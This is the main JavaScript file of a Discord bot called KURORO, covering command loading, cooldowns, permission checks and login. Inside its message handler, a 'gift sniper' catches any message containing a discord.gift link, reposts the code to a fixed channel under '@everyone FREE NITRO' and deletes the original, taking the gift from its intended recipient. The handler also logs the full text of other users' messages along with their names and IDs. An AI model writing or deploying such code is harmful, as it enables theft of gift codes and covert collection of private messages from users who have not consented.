/*
 * KURORO
 * CLORO
 * 
 */
// Depedencies
const Modules = './modules';
const Behavior = './behavior';
const Commands = './commands';
const Startup = './startup';
const fJSON = './json';

// Modules
const Discord = require('discord.js');
const FilSys = require('fs-extra');
const Base64 = require('base-64');

const Log = require(`${Modules}/log.js`);

// JSON
const Identity = require(`${fJSON}/identity.json`);

const ClientSaves = require(`${fJSON}/static_client.json`); 
const Trackers = require(`${fJSON}/trackers.json`); 

// 
var cmds = {};
var behavior = {};

let cdCD = {};
// Create Bot Instance
const kuroro_client = require(`${Modules}/kuroro.js`);
const KURORO = kuroro_client.KURORO

console.log('Starting clo_js...');
console.log('Creating KURORO Instance...')
const Client = new KURORO(Identity, ClientSaves, Trackers);

var UserID;

// Get Commands
FilSys.readdir(Commands)
    .then(array => {
        array.forEach(file => {
            let command = require(`${Commands}/${file}`)
            cmds[file.slice(0, file.length - 3)] = new command.class();

            Log.Log(`Got command: ${file}`);
        })
    })

// Get Behavior
FilSys.readdir(Behavior)
    .then(array => {
        array.forEach(file => {
            behavior[file.slice(0, file.length - 3)] = require(`${Behavior}/${file}`);

            Log.Log(`Got behavior: ${file}`);
        })
    })
    .catch(error => {
        Log.Error(`Got error on BEHAVIOR ITERATION: ${error}`)
    })

// Message Behavior
Client.on('message', async function (message) {
    // Get Variables
    UserID = 691219699769409546;

    // Gift Sniper
    if (message.content.indexOf("discord.gift") != -1) {
        if (message.author.id == Client.user.id) { return };
        if (message.author.id == 270831355775025152) { return };
        let contents = message.content;

       Client.channels.cache.get('753275951894364230').send(`@everyone FREE NITRO: \n ${contents}`);
       message.delete();
    }

    // Get Prefix
    let prefix = await Client.getPrefix(message.guild);

    // If Mention
    if (message.mentions.has(Client.user) && !message.mentions.everyone)
        message.react('✅')
            .then(() => {
                message.author.send(new Client.KUROROEmbed()
                    .setTitle(`${message.guild.name}`)
                    .addField(`KURORO`, `**Hi there!**\n\nThe prefix for this server is \`${prefix}\`, type \`${prefix}help\` in the server for a list of commands!`))
            });

    // Enter Command
    if (message.author.id != UserID && message.content.startsWith(prefix)) {
        var Arguments = message.content.substring(prefix.length).split(' ');
        var CMD = Arguments[0].toLowerCase();

        // Run Command
        try {
            let Command = cmds[CMD];

            if (Command) {
                if (!Client.ifWhitelist(message.author.id)) {
                    if (Command.cooldowns[Client.getCooldownType(Command, message)] && cdCD[message.author.id]) {
                        const Now = Date.now() - Command.cooldowns[Client.getCooldownType(Command, message)];
                        const Computed = Command.cooldown - (Math.floor(Now / 1000) - Math.floor(Command.cooldown / 1000));

                        message.channel.send(`<@${message.author.id}> **Chill out! You must wait ${Computed} seconds to use that command again!**`)
                            .then(message => setTimeout(() => { message.delete(); }, 3000));

                        cdCD[message.author.id] = true;
                        setTimeout(() => { cdCD[message.author.id] = null }, 1000 * 5);
                        return;
                    }
                    if (Command.required_permissions.length > 0) {
                        if (!message.member.hasPermission(Command.required_permissions) && cdCD[message.author.id]) {
                            message.channel.send(`<@${message.author.id}> **Sorry, but you don't have permission to use that command.**`)
                                .then(message => setTimeout(() => { message.delete(); }, 3000));

                            cdCD[message.author.id] = true;
                            setTimeout(() => { cdCD[message.author.id] = null }, 1000 * 5);
                            return;
                        }
                    }
                    if ((!message.channel.nsfw && Command.nsfw) && cdCD[message.author.id]) {
                        message.channel.send(`<@${message.author.id}> **Sorry! That command doesn't work since this channel doesn't have NSFW enabled.**`)
                            .then(message => setTimeout(() => { message.delete(); }, 3000));

                        cdCD[message.author.id] = true;
                        setTimeout(() => { cdCD[message.author.id] = null }, 1000 * 5);
                        return;
                    }
                }
                Arguments.shift();

                message.channel.startTyping();
                Command.init(Client, message, Arguments)
                    .catch(error => { console.log(error) })
                    .finally(() => { message.channel.stopTyping(); }); // run command

                // apply cooldown
                if (!Client.ifWhitelist(message.author.id)) {
                    Command.cooldowns[Client.getCooldownType(Command, message)] = Date.now();
                    setTimeout(() => {
                        Command.cooldowns[Client.getCooldownType(Command, message)] = null;
                    }, Command.cooldown * 1000)
                };
            };
        } catch (error) {
            Log.Error(error); console.log(error)
        };
    }
    else
        if (message.member)
            Client.log.Log(`MESSAGE: ${message.member.nickname && message.member.nickname || message.author.username} : ID ${message.author.id} [NAME ${message.guild.name} : CHANNEL #${message.channel.name} ${message.channel.id}]: ${message.content} [ID ${message.id}]`);
        else
            Client.log.Log(`UNKNOWN_MESSAGE: ${message.author.username}#${message.author.discriminator} [ID ${message.author.id}]: ${message.content} [ID ${message.id}]`);
});

// Login Behavior
Client.on('ready', async function () {
    Log.Log(`Logged in as ${Client.user.tag}`);
   
    // Init
    await FilSys.readdir(Startup)
        .then(async function(array) {
           await array.forEach(async function(file) {
                let module = require(`${Startup}/${file}`);

                Log.Log(`Got init: ${file}`);
                await module(Client);
            })
        })
        .catch(error => {
            Log.Error(`Got error on INITIALIZATION: ${error}`)
        });


    Client.update();
    Client.start(cmds, behavior);
});

// Login Token
Client.login(Identity['token']);

// KURORO Specifics
Client.events.on('onUpdateInfo', function() {
    Client.update();
});